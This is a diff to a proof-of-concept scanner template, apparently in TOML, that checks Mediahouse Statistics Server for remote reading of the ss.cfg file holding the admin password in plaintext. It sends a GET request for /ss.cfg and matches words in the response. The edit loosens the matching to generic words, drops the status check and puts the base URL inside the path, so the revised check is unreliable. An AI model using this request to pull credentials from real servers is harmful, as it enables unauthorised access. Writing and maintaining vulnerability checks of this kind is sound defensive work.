@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证目标服务器是否存在 Mediahouse Statistics Server 管理员密码明文泄露漏洞，通过访问 ss.cfg 配置文件检查是否以明文存储管理员密码"
+description = "检测 Mediahouse Statistics Server 的 ss.cfg 配置文件是否可被远程读取，该文件以明文存储管理员密码。攻击者可通过直接请求 /ss.cfg 路径获取管理员凭据。"
 id = "POC-AVE-1999-0731"
-name = "CVE-1999-0932 Mediahouse Statistics Server Admin Password Disclosure PoC"
+name = "Mediahouse Statistics Server 管理员密码明文读取 PoC"
 severity = "high"
 tags = ["ave-1999-0731"]
 vuln_id = [
@@ -11,24 +11,23 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/ss.cfg"
+path = "/{{BaseURL}}/ss.cfg"
 protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "ADMINPASS",
+    "admin",
     "password",
-    "adminpass",
+    "ss.cfg",
 ]
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
